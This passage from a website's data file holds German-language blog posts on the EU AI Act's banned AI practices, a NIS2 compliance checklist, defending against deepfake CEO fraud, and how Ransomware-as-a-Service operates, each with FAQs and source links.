<p>Der Einsatz von KI-Systemen zur biometrischen Echtzeit-Fernidentifikation in öffentlich zugänglichen Räumen durch Strafverfolgungsbehörden ist grundsätzlich verboten. Ausnahmen gelten nur für sehr schwere Straftaten und müssen gerichtlich genehmigt werden.</p>
<h3>5. Emotion Recognition in sensiblen Kontexten</h3>
<p>KI-Systeme zur Erkennung von Emotionen am Arbeitsplatz und in Bildungseinrichtungen sind verboten. Ausnahmen gelten für medizinische oder sicherheitsrelevante Anwendungen.</p>
<h3>6. Predictive Policing auf Basis persönlicher Merkmale</h3>
<p>Verboten sind KI-Systeme, die ausschließlich auf Basis von Persönlichkeitsmerkmalen oder früheren Straftaten das Risiko einer Person für zukünftige Straftaten vorhersagen.</p>

<h2>Hochrisiko-KI-Systeme und ihre Pflichten</h2>
<p>Neben den verbotenen KI-Systemen definiert der EU AI Act eine Kategorie von Hochrisiko-KI, die streng reguliert, aber erlaubt ist:</p>
<ul>
<li>KI in kritischer Infrastruktur (Energie, Wasser, Verkehr)</li>
<li>KI-gestützte Einstellungssysteme und HR-Tools</li>
<li>KI in der Bildung (Bewertung von Schülern und Studierenden)</li>
<li>KI in Strafverfolgung und Justiz</li>
<li>KI in der Kreditwürdigkeitsprüfung und Versicherungen</li>
</ul>
<p>Für Hochrisiko-KI gelten umfangreiche Pflichten: Risikomanagement-System, Datenqualitätssicherung, technische Dokumentation, Transparenzpflichten, menschliche Aufsicht und CE-Kennzeichnung.</p>

<h2>Zeitplan der Verbote und Bußgelder</h2>
<ul>
<li><strong>1. August 2024:</strong> Inkrafttreten des Gesetzes</li>
<li><strong>2. Februar 2025:</strong> Verbote für unakzeptable Risiken (Artikel 5)</li>
<li><strong>2. August 2025:</strong> Regeln für General-Purpose AI (GPAI)</li>
<li><strong>2. August 2026:</strong> Vollständige Anwendung aller Pflichten für Hochrisiko-KI</li>
</ul>
<p>Die Bußgelder: <strong>Bis 35 Millionen Euro oder 7% des weltweiten Jahresumsatzes</strong> für Verstöße gegen die Verbote nach Artikel 5. Bis 15 Millionen Euro oder 3% für andere Verstöße.</p>
<blockquote>
<p>"Der EU AI Act setzt globale Standards. Unternehmen, die heute in Compliance investieren, vermeiden nicht nur Bußgelder, sondern sichern sich einen Wettbewerbsvorteil auf dem europäischen Markt." – Europäisches Parlament, März 2024</p>
</blockquote>`,
    category: 'EU AI Act',
    categoryColor: '#00F0FF',
    categoryBg: 'rgba(0,240,255,0.08)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: EU AI Act (Verordnung 2024/1689), Europäisches Parlament, European AI Office',
    publishedAt: '2026-05-08',
    readTime: 11,
    imageGradient: 'linear-gradient(135deg, #000D1A 0%, #001F3D 40%, #000D1A 100%)',
    imageAlt: 'EU AI Act verbotene KI-Systeme Übersicht',
    badge: 'Aktuell',
    badgeColor: '#00F0FF',
    tags: ['EU AI Act', 'Regulierung', 'Verbotene KI', 'Biometrie', 'Social Scoring', 'Compliance'],
    faqs: [
      { q: 'Gilt der EU AI Act auch für Unternehmen außerhalb der EU?', a: 'Ja. Der EU AI Act gilt für alle Anbieter, die KI-Systeme auf dem EU-Markt in Verkehr bringen oder in Betrieb nehmen, unabhängig vom Unternehmenssitz. Dies betrifft explizit US-amerikanische, chinesische und andere internationale Technologieunternehmen.' },
      { q: 'Was passiert, wenn ein Unternehmen ein verbotenes KI-System bereits einsetzt?', a: 'Unternehmen müssen verbotene Systeme bis zum 2. Februar 2025 einstellen. Es gibt keine Übergangsfrist. Die zuständigen nationalen Marktaufsichtsbehörden können Bußgelder verhängen und den sofortigen Betriebsstopp anordnen.' },
      { q: 'Wie unterscheiden sich "verbotene KI" und "Hochrisiko-KI"?', a: 'Verbotene KI nach Artikel 5 ist vollständig untersagt. Hochrisiko-KI ist erlaubt, unterliegt aber strengen Anforderungen: technische Dokumentation, Konformitätsbewertung, Registrierung und menschliche Aufsicht.' },
      { q: 'Sind KI-Chatbots wie ChatGPT vom EU AI Act betroffen?', a: 'Ja. Große Sprachmodelle fallen unter die Kategorie "General-Purpose AI" (GPAI). Ab August 2025 gelten für GPAI-Anbieter spezifische Transparenz-, Dokumentations- und Sicherheitspflichten.' },
      { q: 'Was ist die European AI Office und welche Rolle spielt sie?', a: 'Das European AI Office wurde als zentrale EU-Behörde für die Durchsetzung des EU AI Acts eingerichtet. Es ist primär für die Aufsicht über GPAI-Anbieter zuständig und koordiniert die Entwicklung von Verhaltenskodizes und technischen Standards.' },
    ],
    sources: [
      { title: 'EU AI Act Volltext (Verordnung 2024/1689)', url: 'https://eur-lex.europa.eu/legal-content/DE/TXT/?uri=CELEX:32024R1689' },
      { title: 'European AI Office', url: 'https://digital-strategy.ec.europa.eu/en/policies/ai-office' },
      { title: 'Europäisches Parlament: AI Act erklärt', url: 'https://www.europarl.europa.eu/topics/de/article/20230601STO93804/ki-gesetz-erste-regulierung-der-kunstlichen-intelligenz' },
    ],
  },

  // ── 8. NIS2 Mittelstand ─────────────────────────────────────────────────────
  {
    id: 'post-nis2-richtlinie-mittelstand',
    slug: 'nis2-richtlinie-mittelstand',
    title: 'NIS2 Checkliste Mittelstand 2026: Pflichten, Fristen & Sofortmaßnahmen',
    excerpt: 'NIS2 trifft 29.500 deutsche Unternehmen — nur 10% haben sich bisher beim BSI registriert. Bußgelder bis 10 Millionen Euro drohen. Unsere NIS2-Checkliste zeigt Ihnen welche Pflichten gelten, bis wann und was Sie sofort tun müssen.',
    content: `<h2>Was ist die NIS2-Richtlinie?</h2>
<p>NIS2 steht für "Network and Information Security Directive 2" – die zweite EU-Richtlinie zur Netz- und Informationssicherheit. Sie wurde am 14. Dezember 2022 vom Europäischen Rat verabschiedet. In Deutschland erfolgt die Umsetzung durch das NIS2-Umsetzungsgesetz (NIS2UmsuCG).</p>
<p>Gegenüber der Vorgängerrichtlinie erweitert NIS2 den Anwendungsbereich erheblich: Statt weniger hundert kritischer Infrastrukturen in Deutschland sind nun schätzungsweise <strong>29.000 bis 40.000 deutsche Unternehmen</strong> betroffen.</p>

<h2>Wen betrifft NIS2? Die Schwellenwerte im Detail</h2>
<h3>Betroffene Sektoren</h3>
<p>NIS2 gilt für Unternehmen in folgenden Sektoren:</p>
<ul>
<li>Energie (Strom, Gas, Öl, Fernwärme, Wasserstoff)</li>
<li>Verkehr (Luft, Schiene, Wasser, Straße)</li>
<li>Bankwesen und Finanzmarktinfrastrukturen</li>
<li>Gesundheitswesen (Krankenhäuser, Labore, Forschung, Pharmahersteller)</li>
<li>Trinkwasser und Abwasser</li>
<li>Digitale Infrastruktur (Cloud, Rechenzentren, DNS, ISPs)</li>
<li>IKT-Dienstleistungsmanagement (Managed Service Provider, MSSP)</li>
<li>Post- und Kurierdienste, Abfallwirtschaft, Chemie, Lebensmittel, Verarbeitendes Gewerbe</li>
</ul>
<h3>Größenschwellen</h3>
<p>Innerhalb der betroffenen Sektoren gilt NIS2 für Unternehmen mit mindestens:</p>
<ul>
<li><strong>50 Mitarbeitern</strong> (Vollzeitäquivalent) ODER</li>
<li><strong>10 Millionen Euro Jahresumsatz</strong> und 2 Millionen Euro Jahresbilanzsumme</li>
</ul>

<h2>Pflichten für betroffene Unternehmen</h2>
<h3>Risikomanagementmaßnahmen (Artikel 21)</h3>
<ul>
<li>Risikoanalyse und Sicherheitskonzept für Informationssysteme</li>
<li>Incident Response: Konzepte für Bewältigung von Sicherheitsvorfällen</li>
<li>Business Continuity: Backup-Management, Wiederherstellung, Krisenmanagement</li>
<li>Lieferkettensicherheit: Sicherheitsanforderungen an Lieferanten und Dienstleister</li>
<li>Kryptographie und Verschlüsselung</li>
<li>Zugangskontrolle und Multi-Faktor-Authentifizierung</li>
</ul>
<h3>Meldepflichten bei Sicherheitsvorfällen</h3>
<ul>
<li><strong>24 Stunden:</strong> Erstmeldung (Frühwarnung) an das BSI</li>
<li><strong>72 Stunden:</strong> Vollständige Meldung mit Bewertung</li>
<li><strong>1 Monat:</strong> Abschlussbericht mit Ursachenanalyse</li>
</ul>
<h3>Haftung der Geschäftsführung</h3>
<p>NIS2 stellt die persönliche Haftung von Leitungsorganen explizit klar. Geschäftsführer und Vorstände müssen die Cybersicherheitsmaßnahmen billigen und können bei Pflichtverletzungen persönlich haftbar gemacht werden.</p>

<h2>Bußgelder und Handlungsempfehlungen</h2>
<ul>
<li><strong>Wesentliche Einrichtungen:</strong> Bis zu 10 Millionen Euro oder 2% des weltweiten Jahresumsatzes</li>
<li><strong>Wichtige Einrichtungen:</strong> Bis zu 7 Millionen Euro oder 1,4% des Jahresumsatzes</li>
</ul>
<p>Konkrete Handlungsschritte für den Mittelstand:</p>
<ul>
<li><strong>Betroffenheit prüfen:</strong> Fällt das Unternehmen in einen der Sektoren und überschreitet die Schwellenwerte?</li>
<li><strong>Gap-Analyse durchführen:</strong> Vergleich der bestehenden Sicherheitsmaßnahmen mit den NIS2-Anforderungen</li>
<li><strong>Incident-Response-Plan erstellen:</strong> Klare Prozesse für Meldung und Reaktion auf Sicherheitsvorfälle</li>
<li><strong>MFA einführen:</strong> Multi-Faktor-Authentifizierung für alle kritischen Systeme</li>
</ul>
<blockquote>
<p>"NIS2 ist keine bürokratische Übung. Die Anforderungen spiegeln den Mindeststandard wider, den Unternehmen für ihre eigene Überlebensfähigkeit in der aktuellen Bedrohungslage benötigen." – Bundesamt für Sicherheit in der Informationstechnik (BSI)</p>
</blockquote>

<h2 id="checkliste">NIS2-Checkliste für den Mittelstand 2026</h2>
<p>Nur knapp <strong>10% der ~29.500 verpflichteten deutschen Unternehmen</strong> haben sich bis zur BSI-Registrierungsfrist (6. März 2026) registriert. Nutzen Sie diese Checkliste als Sofortmaßnahmen-Plan. Abhaken bedeutet: diese Pflicht ist erfüllt.</p>

<h3 id="checkliste-phase1">Phase 1: Betroffenheit prüfen (sofort)</h3>
<ul>
<li>✅ <strong>Sektor-Check:</strong> Gehört Ihr Unternehmen zu einem der 18 NIS2-Sektoren (Energie, Gesundheit, Transport, IKT, Finanz, Lebensmittel, Maschinenbau etc.)?</li>
<li>✅ <strong>Größen-Check:</strong> ≥ 50 Mitarbeiter ODER ≥ 10 Mio. € Jahresumsatz + 2 Mio. € Bilanzsumme?</li>
<li>✅ <strong>Lieferkette prüfen:</strong> Sind Sie IT-Dienstleister (MSP/MSSP) für betroffene Unternehmen? Dann direkt betroffen.</li>
<li>✅ <strong>BSI-Selbsteinstufung:</strong> Wesentliche Einrichtung (≥ 250 MA oder ≥ 50 Mio. €) oder wichtige Einrichtung?</li>
</ul>

<h3 id="checkliste-phase2">Phase 2: BSI-Registrierung (dringend)</h3>
<ul>
<li>✅ <strong>ELSTER-Zertifikat beantragen:</strong> Benötigt für BSI-Registrierungsportal. Bearbeitungszeit: 5–10 Werktage.</li>
<li>✅ <strong>Registrierung im BSI-Portal:</strong> Auf bsi.bund.de/nis2 registrieren. Pflichtangaben: Unternehmensname, Sektor, Kontaktdaten, KRITIS-Status.</li>
<li>✅ <strong>NIS2-Kontaktperson benennen:</strong> Eine verantwortliche Person für Cybersicherheit und BSI-Meldungen bestimmen.</li>
</ul>

<h3 id="checkliste-phase3">Phase 3: Risikomanagement (innerhalb 3 Monate)</h3>
<ul>
<li>✅ <strong>IT-Asset-Inventar erstellen:</strong> Alle Systeme, Software, Cloud-Dienste und OT-Komponenten erfassen.</li>
<li>✅ <strong>Risikoanalyse durchführen:</strong> Für jeden Asset: Wahrscheinlichkeit × Schadenspotenzial. Dokumentiert und aktuell halten.</li>
<li>✅ <strong>Sicherheitskonzept erstellen:</strong> Schriftliches Informationssicherheits-Managementsystem (ISMS) — auch vereinfacht nach BSI IT-Grundschutz möglich.</li>
<li>✅ <strong>MFA für alle kritischen Systeme:</strong> VPN, E-Mail, Admin-Konsolen, Cloud-Dienste — Multi-Faktor-Authentifizierung aktivieren.</li>
<li>✅ <strong>Backup-Strategie 3-2-1:</strong> 3 Kopien, 2 Medien, 1 Offline/Air-Gap. Regelmäßig auf Wiederherstellbarkeit testen.</li>
<li>✅ <strong>Patch-Management-Prozess:</strong> Kritische Sicherheitslücken (CVSS ≥ 9) innerhalb von 24 Stunden patchen.</li>
<li>✅ <strong>Verschlüsselung einführen:</strong> Ende-zu-Ende-Verschlüsselung für sensible Daten und Kommunikation.</li>
</ul>

<h3 id="checkliste-phase4">Phase 4: Incident Response (innerhalb 6 Monate)</h3>
<ul>
<li>✅ <strong>Incident-Response-Plan erstellen:</strong> Schriftlicher Plan mit klaren Verantwortlichkeiten, Eskalationswegen und Kommunikationsprotokoll.</li>
<li>✅ <strong>Meldeprozess BSI etablieren:</strong> Automatismus für 24h-Erstmeldung, 72h-Detailmeldung, 1-Monat-Abschlussbericht.</li>
<li>✅ <strong>Krisenteam definieren:</strong> Wer entscheidet was im Notfall? IT, Geschäftsführung, Rechtsabteilung, PR — klare Rollen.</li>
<li>✅ <strong>IR-Übung durchführen:</strong> Jährliche Simulation eines Sicherheitsvorfalls (Tabletop-Übung).</li>
</ul>

<h3 id="checkliste-phase5">Phase 5: Lieferkette & Schulung (laufend)</h3>
<ul>
<li>✅ <strong>Lieferanten-Sicherheitsanforderungen:</strong> Sicherheitsanforderungen vertraglich in alle neuen IT-Verträge aufnehmen.</li>
<li>✅ <strong>Mitarbeiterschulungen:</strong> Jährliche Cyber-Hygiene-Schulungen, Phishing-Simulationen, NIS2-Awareness für Führungskräfte.</li>
<li>✅ <strong>Geschäftsführung briefen:</strong> GF und Vorstand müssen Cybersicherheitsmaßnahmen billigen — persönliche Haftung besteht.</li>
</ul>

<h2 id="fristen">Fristen im Überblick 2026</h2>
<pre><code># NIS2-Fristen Deutschland 2026
06.12.2025  → NIS2-Umsetzungsgesetz in Kraft
06.03.2026  → BSI-Registrierungsfrist (bereits abgelaufen — sofort nachholen!)
Laufend     → Meldepflicht: 24h Erstmeldung bei Sicherheitsvorfällen
Laufend     → Risikomanagement und ISMS-Pflichten aktiv
2026+       → BSI-Audits und Kontrollen</code></pre>

<h2 id="bussgelder">Bußgelder bei NIS2-Verstößen</h2>
<ul>
<li><strong>Wesentliche Einrichtungen:</strong> Bis zu <strong>10 Millionen Euro</strong> oder 2% des weltweiten Jahresumsatzes (der höhere Wert)</li>
<li><strong>Wichtige Einrichtungen:</strong> Bis zu <strong>7 Millionen Euro</strong> oder 1,4% des Jahresumsatzes</li>
<li><strong>Persönliche Haftung GF/Vorstand:</strong> Bei nachgewiesener Fahrlässigkeit kann die Geschäftsführung persönlich haftbar gemacht werden — auch mit Privatvermögen</li>
</ul>

<h2 id="fazit-nis2">Fazit: Was jetzt zu tun ist</h2>
<p>Wenn Ihr Unternehmen in einen der 18 NIS2-Sektoren fällt und die Schwellenwerte überschreitet, haben Sie jetzt drei Optionen: <strong>1) Sofort handeln</strong> (diese Checkliste abarbeiten), <strong>2) Externen Berater beauftragen</strong> (empfohlen wenn kein eigenes ISMS vorhanden) oder <strong>3) Nichts tun</strong> und auf Bußgelder warten. Option 3 empfehlen wir nicht.</p>
<p>Der wichtigste erste Schritt: <strong>BSI-Registrierung nachholen</strong>, auch wenn die Frist abgelaufen ist. Das BSI bewertet den Willen zur Compliance positiv — eine nachgeholte Registrierung ist besser als keine.</p>`,
    category: 'Compliance',
    categoryColor: '#00D4A0',
    categoryBg: 'rgba(0,212,160,0.08)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: NIS2-Richtlinie (EU) 2022/2555, BSI NIS2-Portal, Heise.de, NIS2UmsuCG',
    publishedAt: '2026-06-06',
    readTime: 14,
    imageGradient: 'linear-gradient(135deg, #001A14 0%, #00291F 40%, #001A14 100%)',
    imageAlt: 'NIS2 Richtlinie Mittelstand Compliance',
    tags: ['NIS2', 'Compliance', 'Cybersicherheit', 'KRITIS', 'Mittelstand', 'Meldepflicht'],
    faqs: [
      { q: 'Muss ich mein Unternehmen aktiv bei einer Behörde registrieren?', a: 'Ja, betroffene Einrichtungen müssen sich beim BSI registrieren. Das BSI stellt eine Registrierungsplattform bereit. Die Registrierungspflicht gilt unabhängig davon, ob das Unternehmen bereits nach anderen Gesetzen reguliert ist.' },
      { q: 'Gilt NIS2 auch für Unternehmen, die IT-Dienstleistungen für betroffene Sektoren erbringen?', a: 'Ja, explizit. Managed Service Provider (MSPs) und MSSPs sind in Anhang II der NIS2-Richtlinie als "Wichtige Einrichtungen" aufgeführt und unterliegen direkt den NIS2-Pflichten.' },
      { q: 'Was gilt als "erheblicher Sicherheitsvorfall", der gemeldet werden muss?', a: 'Ein Sicherheitsvorfall ist erheblich, wenn er schwerwiegende Betriebsstörungen verursacht oder erhebliche finanzielle Verluste zur Folge hat. Im Zweifel empfiehlt das BSI, lieber zu früh zu melden als zu spät.' },
      { q: 'Welche Strafen drohen bei Nichteinhaltung?', a: 'Für wesentliche Einrichtungen bis zu 10 Millionen Euro oder 2% des weltweiten Jahresumsatzes. Für wichtige Einrichtungen bis zu 7 Millionen Euro oder 1,4% des Umsatzes. Leitungsorgane können persönlich haftbar gemacht werden.' },
      { q: 'Kann ein Unternehmen NIS2-Compliance extern auslagern?', a: 'Die Verantwortung bleibt immer beim Unternehmen und seiner Geschäftsführung. Technische Umsetzung kann an qualifizierte MSSPs delegiert werden. Auslagerung befreit nicht von der Haftung.' },
    ],
    sources: [
      { title: 'NIS2-Richtlinie (EU) 2022/2555 Volltext', url: 'https://eur-lex.europa.eu/legal-content/DE/TXT/?uri=CELEX:32022L2555' },
      { title: 'BSI zur NIS2-Umsetzung in Deutschland', url: 'https://www.bsi.bund.de/DE/Themen/Unternehmen-und-Organisationen/Standards-und-Zertifizierung/NIS-2/nis-2_node.html' },
      { title: 'BSI-Lagebericht zur IT-Sicherheit 2023', url: 'https://www.bsi.bund.de/DE/Service-Navi/Presse/Pressemitteilungen/Presse2023/231026_Lagebericht.html' },
    ],
  },

  // ── 9. Deepfakes ────────────────────────────────────────────────────────────
  {
    id: 'post-deepfakes-unternehmen-erkennen',
    slug: 'deepfakes-unternehmen-erkennen',
    title: 'Deepfakes im Unternehmenskontext: Wie CEO-Fraud durch KI eskaliert',
    excerpt: 'Deepfake-Technologie wird aktiv für CEO-Fraud eingesetzt. In dokumentierten Fällen wurden Mitarbeiter durch KI-generierte Audio- und Videoinhalte zu Überweisungen in Millionenhöhe verleitet. So erkennen und schützen sich Unternehmen.',
    content: `<h2>Was sind Deepfakes?</h2>
<p>Deepfakes sind synthetische Medieninhalte (Audio, Video oder Bilder), die mithilfe von Deep-Learning-Algorithmen erstellt werden, um echte Personen täuschend echt nachzuahmen. Die Technologie basiert auf Generative Adversarial Networks (GANs) oder Diffusion Models.</p>
<p>Laut einem Report von Deloitte aus dem Jahr 2023 haben <strong>25% der befragten Unternehmen bereits Deepfake-bezogene Sicherheitsvorfälle erlebt</strong>. Die tatsächliche Dunkelziffer dürfte höher liegen.</p>

<h2>CEO-Fraud durch Deepfakes: Dokumentierte Fälle</h2>
<p>Der bislang bekannteste dokumentierte Fall ereignete sich 2019: Ein britischer Energieversorger überwies 220.000 Euro an Cyberkriminelle, nachdem ein Mitarbeiter einen Anruf vom vermeintlichen Vorstandsvorsitzenden des deutschen Mutterkonzerns erhalten hatte. Die Stimme war mittels KI geklont worden.</p>
<p>2023 wurde in Hongkong ein Mitarbeiter eines Finanzunternehmens durch ein gefälschtes Video-Konferenzgespräch dazu gebracht, umgerechnet 25 Millionen US-Dollar zu überweisen. Die Angreifer hatten mehrere Kollegen des Mitarbeiters durch Deepfake-Avatare simuliert.</p>

<h2>Wie man Deepfakes erkennt</h2>
<h3>Visuelle Artefakte in Video-Deepfakes</h3>
<ul>
<li><strong>Gesichtsränder:</strong> Unnatürliche Übergänge zwischen dem geklonten Gesicht und dem restlichen Kopf, besonders bei Bewegung</li>
<li><strong>Augen:</strong> Unnatürliches Blinzeln, starre oder fehlende Lichtreflexe in den Pupillen</li>
<li><strong>Haare:</strong> Feinstränge am Rand des Gesichts werden von KI-Systemen oft schlecht gerendert</li>
<li><strong>Beleuchtung:</strong> Inkonsistente Schatten zwischen Gesicht und Umgebung</li>
<li><strong>Lippensynchronisation:</strong> Lippenbewegungen und Sprache stimmen nicht exakt überein</li>
</ul>
<h3>Artefakte in Audio-Deepfakes</h3>
<ul>
<li>Unnatürliche Pausen oder Atemgeräusche an falschen Stellen</li>
<li>Gleichmäßige, zu "saubere" Klangqualität ohne Hintergrundgeräusche</li>
<li>Metall-ähnlicher oder leicht roboterhafter Klang bei emotionalen Äußerungen</li>
</ul>
<h3>Technische Erkennungsmethoden</h3>
<ul>
<li><strong>Deepfake-Erkennungstools:</strong> Microsoft Video Authenticator, Sensity AI, Intel FakeCatcher</li>
<li><strong>Echtzeit-Verifizierung:</strong> Bei Videoanrufen unerwartete Aktionen anfordern, auf die KI-Systeme nicht in Echtzeit reagieren können</li>
</ul>

<h2>Schutzmaßnahmen für Unternehmen</h2>
<ul>
<li><strong>Verbales Codewort-System:</strong> Führungskräfte und Mitarbeiter vereinbaren ein nicht-öffentliches Codewort für ungewöhnliche Anfragen.</li>
<li><strong>Dual-Control-Prinzip bei Zahlungen:</strong> Keine Zahlung auf Basis eines einzigen Kommunikationskanals. Jede außergewöhnliche Überweisung muss durch einen zweiten, unabhängigen Kanal bestätigt werden.</li>
<li><strong>Awareness-Schulungen:</strong> Mitarbeiter müssen wissen, dass Deepfake-CEO-Fraud existiert und wie Angriffsszenarien ablaufen.</li>
<li><strong>Verifizierungsprotokoll für ungewöhnliche Anfragen:</strong> Klarer Prozess für außergewöhnliche Anfragen von Führungskräften.</li>
<li><strong>Beschränkung öffentlicher Audio- und Videoinhalte:</strong> Je weniger öffentliches Audiomaterial von Führungskräften verfügbar ist, desto schwieriger ist die Erstellung überzeugender Stimmklone.</li>
</ul>
<blockquote>
<p>"Die beste Verteidigung gegen Deepfake-Betrug ist nicht Technologie, sondern Prozess. Ein Vier-Augen-Prinzip bei Überweisungen schlägt jeden Deepfake-Detektor." – Europol Cybercrime Centre (EC3)</p>
</blockquote>`,
    category: 'KI-Bedrohung',
    categoryColor: '#FFB800',
    categoryBg: 'rgba(255,184,0,0.08)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Deloitte Deepfake Report 2023, Europol EC3, dokumentierte CEO-Fraud-Fälle',
    publishedAt: '2026-05-06',
    readTime: 9,
    imageGradient: 'linear-gradient(135deg, #1A1200 0%, #2D1F00 40%, #1A1200 100%)',
    imageSrc: '/blog/deepfakes-ceo-fraud.jpg',
    imageAlt: 'Deepfake CEO-Fraud Unternehmensschutz',
    tags: ['Deepfakes', 'CEO-Fraud', 'KI-Betrug', 'Social Engineering', 'Audio-Deepfake', 'Video-Deepfake'],
    faqs: [
      { q: 'Wie viel Audiomaterial wird benötigt, um eine Stimme zu klonen?', a: 'Moderne Sprachkloning-Dienste wie ElevenLabs benötigen bereits drei bis fünf Sekunden qualitatives Audiomaterial für eine grundlegende Stimmkopie. Öffentliche Interviews, Unternehmensvideos oder LinkedIn-Videos von Führungskräften liefern Angreifern ausreichend Material.' },
      { q: 'Kann ich einen Deepfake in Echtzeit erkennen?', a: 'Echtzeit-Deepfake-Erkennung ist technisch anspruchsvoll und fehleranfällig. Zuverlässiger sind strukturelle Verifizierungsmaßnahmen: unerwartete Aktionen anfordern, ein Codewort abfragen oder die Person über einen bekannten alternativen Kanal kontaktieren.' },
      { q: 'Welche Branchen sind besonders häufig Ziele von Deepfake-Angriffen?', a: 'Finanzdienstleistungen, Versicherungen und Unternehmen mit häufigen internationalen Überweisungen sind primäre Ziele. CEO-Fraud trifft statistisch am häufigsten mittelgroße Unternehmen mit weniger strikten Zahlungsprozessen als Großkonzerne.' },
      { q: 'Sind Versicherungen gegen Deepfake-Betrug verfügbar?', a: 'Cyberpolicen decken zunehmend auch Social-Engineering-Angriffe einschließlich CEO-Fraud ab. Die Deckung ist jedoch oft an Voraussetzungen geknüpft: Das Unternehmen muss Schutzmaßnahmen wie Dual-Control-Prinzipien und Mitarbeiterschulungen nachweisen.' },
      { q: 'Was sollte ein Mitarbeiter tun, der vermutet, einem Deepfake ausgesetzt worden zu sein?', a: 'Keine Transaktion durchführen und den Vorfall sofort der IT-Abteilung melden. Falls eine Überweisung bereits veranlasst wurde: sofort die Hausbank kontaktieren, um den Transfer zu stoppen, und Anzeige bei der Polizei erstatten.' },
    ],
    sources: [
      { title: 'Deloitte Global Deepfake Survey 2023', url: 'https://www2.deloitte.com/us/en/insights/industry/financial-services/financial-services-industry-predictions/2024/deepfake-banking-fraud.html' },
      { title: 'Europol Deepfake Threat Assessment', url: 'https://www.europol.europa.eu/publications-events/main-reports/facing-reality-law-enforcement-and-challenge-of-deepfakes' },
      { title: 'Intel FakeCatcher Deepfake Detection', url: 'https://www.intel.com/content/www/us/en/research/ie-lab/real-time-deepfake-detection.html' },
    ],
  },

  // ── 10. RaaS erklärt ────────────────────────────────────────────────────────
  {
    id: 'post-ransomware-as-a-service-erklaert',
    slug: 'ransomware-as-a-service-erklaert',
    title: 'Ransomware-as-a-Service: Wie kriminelle Plattformen Cyberangriffe industrialisieren',
    excerpt: 'Ransomware-as-a-Service (RaaS) hat Cyberangriffe demokratisiert. LockBit, BlackCat/ALPHV und Cl0p betreiben Affiliate-Modelle wie SaaS-Unternehmen. Die durchschnittliche Lösegeldzahlung lag 2023 bei 1,54 Millionen US-Dollar laut Sophos.',
    content: `<h2>Was ist Ransomware-as-a-Service?</h2>
<p>Ransomware-as-a-Service (RaaS) ist ein Geschäftsmodell aus der Cyberkriminalität, bei dem spezialisierte Entwickler vollständige Ransomware-Plattformen inklusive Schadsoftware, Command-and-Control-Infrastruktur und Zahlungsabwicklung entwickeln und diese als Service an Partnerangreifer (Affiliates) vermieten.</p>
<p>Das Grundprinzip: Affiliates erhalten Zugang zur RaaS-Plattform und führen eigenständig Angriffe durch. Nach einer erfolgreichen Zahlung behalten die Core Developers typischerweise 15 bis 30%, der Rest geht an den Affiliate.</p>

<h2>Die großen RaaS-Plattformen: LockBit, BlackCat und Cl0p</h2>
<h3>LockBit</h3>
<p>LockBit war bis zu einer koordinierten Behördenoperation im Februar 2024 die produktivste RaaS-Gruppe weltweit. Das System bietet Affiliates ein Dashboard mit Angriffsverwaltung, Lösegeldforderungs-Templates und Verhandlungsportal. LockBit entwickelte das "triple extortion"-Modell: Verschlüsselung, Datendiebstahl und DDoS-Angriffe als dreifacher Druckmechanismus.</p>
<h3>BlackCat (ALPHV)</h3>
<p>ALPHV war eine der technisch fortschrittlichsten RaaS-Gruppen. Die Ransomware war in Rust programmiert und ermöglichte plattformübergreifende Angriffe auf Windows, Linux und VMware ESXi. Im Dezember 2023 wurde die Infrastruktur durch das FBI beschlagnahmt.</p>
<h3>Cl0p</h3>
<p>Cl0p unterscheidet sich durch einen Fokus auf Massenkampagnen via Zero-Day-Exploits. 2023 nutzte die Gruppe eine Schwachstelle in MOVEit-Software aus und stahl Daten von über 2.500 Organisationen weltweit.</p>

<h2>Warum RaaS gefährlicher ist als traditionelle Ransomware</h2>
<ul>
<li><strong>Skalierung:</strong> Hunderte von Affiliates können gleichzeitig auf unterschiedliche Ziele angesetzt werden</li>
<li><strong>Spezialisierung:</strong> Core Developers konzentrieren sich auf Softwareentwicklung, Affiliates auf Initial Access</li>
<li><strong>Professionalisierung:</strong> RaaS-Gruppen bieten Opfern tatsächlich funktionierenden Entschlüsselungs-Support, um ihre "Reputation" zu wahren</li>
<li><strong>Resilienz:</strong> Selbst wenn Core Developers verhaftet werden, können Affiliates zu einer anderen Plattform wechseln</li>
</ul>
<p>Laut Sophos State of Ransomware 2023 betrug die <strong>durchschnittliche Lösegeldzahlung 1,54 Millionen US-Dollar</strong>, ein Anstieg von fast 100% gegenüber 2022.</p>

<h2>Schutzmaßnahmen gegen RaaS-Angriffe</h2>
<h3>Technische Maßnahmen</h3>
<ul>
<li><strong>Offline-Backups nach der 3-2-1-Regel:</strong> 3 Kopien, 2 verschiedene Medien, 1 Kopie offline oder air-gapped</li>
<li><strong>Patch-Management:</strong> Konsequente Aktualisierung aller Systeme, besonders VPN-Gateways und RDP-Zugänge</li>
<li><strong>Multi-Faktor-Authentifizierung:</strong> MFA auf allen extern erreichbaren Diensten</li>
<li><strong>Netzwerksegmentierung:</strong> Lateral Movement nach einem initialen Einbruch verhindern</li>
<li><strong>EDR-Lösung:</strong> Verhaltensbasierte Erkennung von Verschlüsselungsaktivitäten</li>
</ul>
<h3>Organisatorische Maßnahmen</h3>
<ul>
<li><strong>Incident Response Plan:</strong> Klarer, schriftlich fixierter Plan für den Ernstfall</li>
<li><strong>Darknet-Monitoring:</strong> Überwachung von Unternehmensanmeldedaten auf Darknet-Marktplätzen</li>
<li><strong>Lösegeldzahlung als letztes Mittel:</strong> Das BSI empfiehlt, vor einer Zahlung immer Kontakt mit Strafverfolgungsbehörden aufzunehmen</li>
</ul>
<blockquote>
<p>"Ransomware-Gruppen sind keine chaotischen Hacker mehr. Sie sind strukturierte Unternehmen mit HR-Abteilungen, Kundensupport und Qualitätssicherung. Die Verteidigung muss genauso professionell sein." – Sophos Threat Intelligence, 2023</p>
</blockquote>`,
    category: 'Ransomware',
    categoryColor: '#FF7A00',
    categoryBg: 'rgba(255,122,0,0.08)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Sophos State of Ransomware 2023, Europol IOCTA 2023, FBI Cybercrime Report 2023',
    publishedAt: '2026-05-05',
    readTime: 12,
    imageGradient: 'linear-gradient(135deg, #1A0800 0%, #2D1200 40%, #1A0800 100%)',
    imageAlt: 'Ransomware-as-a-Service Affiliate-Modell Visualisierung',
    tags: ['Ransomware', 'RaaS', 'LockBit', 'BlackCat', 'Cl0p', 'Cybercrime', 'Backup'],
    faqs: [
